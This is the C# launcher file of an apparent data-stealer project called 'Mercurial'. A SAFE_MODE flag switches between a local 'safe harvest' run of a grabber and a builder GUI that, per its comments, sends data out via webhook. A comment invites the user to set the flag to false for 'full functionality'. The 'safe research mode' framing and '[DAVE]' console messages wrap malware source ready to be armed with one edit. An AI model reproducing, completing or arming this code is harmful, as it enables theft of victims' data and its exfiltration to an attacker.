using System;
using System.Windows.Forms;

namespace Mercurial
{
    static class Program
    {
        // ===== MASTER TOGGLE =====
        // TRUE  = Safe mode (logs locally, no data leaves your PC)
        // FALSE = Full functionality (sends data via webhook)
        public static bool SAFE_MODE = true;  // <-- CHANGE THIS to false for full mode
        // =========================

        [STAThread]
        static void Main()
        {
            if (SAFE_MODE)
            {
                // SAFE MODE: Run as console app with local logging
                Console.Title = "Mercurial - SAFE RESEARCH MODE";
                Console.WriteLine("[DAVE] SAFE MODE ENABLED — No data will be sent anywhere.");
                Console.WriteLine("[DAVE] All data will be saved to C:\\Mercurial_Safe\\");
                Console.WriteLine("");

                // Run the safe grabber directly
                Grabber.RunSafe();

                Console.WriteLine("");
                Console.WriteLine("[DAVE] Safe harvest complete. Check C:\\Mercurial_Safe\\ for logs.");
                Console.WriteLine("[DAVE] Press any key to exit.");
                Console.ReadKey();
            }
            else
            {
                // ORIGINAL MODE: Launch the builder GUI (full functionality)
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1());
            }
        }
    }
}
